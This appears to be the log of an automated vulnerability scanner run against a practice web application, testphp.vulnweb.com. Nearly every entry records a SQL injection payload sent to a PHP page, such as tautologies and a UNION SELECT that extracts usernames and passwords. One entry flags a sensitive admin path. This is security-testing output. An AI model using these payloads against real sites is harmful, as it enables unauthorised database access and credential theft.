2025-03-05 01:29:51,980 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:29:51.980621', 'url': 'http://testphp.vulnweb.com/admin/', 'vulnerability': 'sensitive', 'payload': 'Sensitive File Found'}
2025-03-05 01:34:54,674 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:54.674486', 'url': 'http://testphp.vulnweb.com/product.php?pic=6', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:34:55,286 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:55.286229', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:34:55,593 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:55.593464', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:34:55,799 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:55.799956', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:34:56,012 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:56.012096', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:34:56,225 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:56.225895', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:34:56,438 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:56.438643', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:34:56,662 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:56.662175', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:34:56,985 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:56.985371', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:34:57,212 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:57.212914', 'url': 'http://testphp.vulnweb.com/listproducts.php?artist=2', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:34:57,431 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:57.431037', 'url': 'http://testphp.vulnweb.com/listproducts.php?artist=2', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:34:57,651 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:57.651662', 'url': 'http://testphp.vulnweb.com/listproducts.php?artist=2', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:34:57,859 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:57.859035', 'url': 'http://testphp.vulnweb.com/listproducts.php?artist=2', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:34:58,280 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:58.280312', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:34:58,495 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:58.495482', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:34:58,711 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:58.711069', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:34:58,921 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:34:58.921568', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:35:00,167 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:00.167563', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:35:00,384 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:00.384390', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:35:00,594 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:00.594837', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:35:00,841 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:00.841071', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:35:01,270 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:01.270893', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:35:01,480 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:01.480344', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:35:07,207 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:07.207985', 'url': 'http://testphp.vulnweb.com/index.php', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:35:07,414 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:07.414332', 'url': 'http://testphp.vulnweb.com/index.php', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:35:07,623 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:07.623432', 'url': 'http://testphp.vulnweb.com/index.php', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:35:07,830 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:07.830840', 'url': 'http://testphp.vulnweb.com/index.php', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:35:08,262 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:08.262542', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:35:08,470 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:08.470619', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:35:08,687 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:08.687543', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:35:08,894 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:08.894108', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:35:09,099 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:09.099904', 'url': 'http://testphp.vulnweb.com/product.php?pic=4', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:35:09,307 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:09.307607', 'url': 'http://testphp.vulnweb.com/product.php?pic=4', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:35:09,519 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:09.519098', 'url': 'http://testphp.vulnweb.com/product.php?pic=4', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:35:09,730 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:09.730439', 'url': 'http://testphp.vulnweb.com/product.php?pic=4', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:35:10,157 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:10.157352', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:35:10,490 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:10.490666', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:35:10,704 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:10.704667', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:35:11,126 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:11.126241', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:35:11,341 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:11.341553', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:35:11,553 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:11.553932', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:35:11,763 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:11.763498', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:35:11,978 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:11.978712', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:35:12,195 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:12.195147', 'url': 'http://testphp.vulnweb.com/product.php?pic=3', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:35:12,403 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:12.403734', 'url': 'http://testphp.vulnweb.com/product.php?pic=3', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:35:12,614 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:12.614785', 'url': 'http://testphp.vulnweb.com/product.php?pic=3', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:35:12,824 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:12.824048', 'url': 'http://testphp.vulnweb.com/product.php?pic=3', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:35:13,253 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:13.253927', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:35:13,471 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:13.471428', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:35:13,938 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:13.938850', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:35:14,321 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:14.321620', 'url': 'http://testphp.vulnweb.com/cart.php', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:35:14,530 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:14.530663', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:35:14,741 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:14.741333', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:35:14,950 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:14.950137', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:35:15,314 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:15.314022', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:35:17,727 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:17.727372', 'url': 'http://testphp.vulnweb.com/listproducts.php?cat=4', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:35:17,949 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:17.949864', 'url': 'http://testphp.vulnweb.com/listproducts.php?cat=4', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:35:18,157 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:18.157366', 'url': 'http://testphp.vulnweb.com/listproducts.php?cat=4', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:35:18,379 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:18.379692', 'url': 'http://testphp.vulnweb.com/listproducts.php?cat=4', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:35:18,804 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:18.803193', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:35:19,013 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:19.013842', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:35:19,231 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:19.231579', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:35:19,441 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:19.441118', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:35:19,650 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:19.650099', 'url': 'http://testphp.vulnweb.com/artists.php', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:35:19,860 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:19.860733', 'url': 'http://testphp.vulnweb.com/artists.php', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:35:20,067 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:20.067325', 'url': 'http://testphp.vulnweb.com/artists.php', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:35:20,274 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:20.274387', 'url': 'http://testphp.vulnweb.com/artists.php', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:35:20,709 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:20.709348', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:35:20,916 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:20.916807', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:35:21,143 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:21.143900', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:35:21,909 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:21.909179', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:35:23,238 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:23.238585', 'url': 'http://testphp.vulnweb.com/listproducts.php?cat=2', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:35:23,476 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:23.476131', 'url': 'http://testphp.vulnweb.com/listproducts.php?cat=2', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:35:23,694 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:23.694143', 'url': 'http://testphp.vulnweb.com/listproducts.php?cat=2', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:35:23,903 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:23.903625', 'url': 'http://testphp.vulnweb.com/listproducts.php?cat=2', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
2025-03-05 01:35:24,326 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:24.326306', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 1=1 --"}
2025-03-05 01:35:24,534 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:24.534495', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' UNION SELECT null, null, username, password FROM users --"}
2025-03-05 01:35:24,744 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:24.744835', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'a'='a"}
2025-03-05 01:35:24,952 - WARNING - [VULNERABILITY] {'timestamp': '2025-03-05T01:35:24.952376', 'url': 'http://testphp.vulnweb.com/search.php?test=query', 'vulnerability': 'sql', 'payload': "' OR 'x'='x' --"}
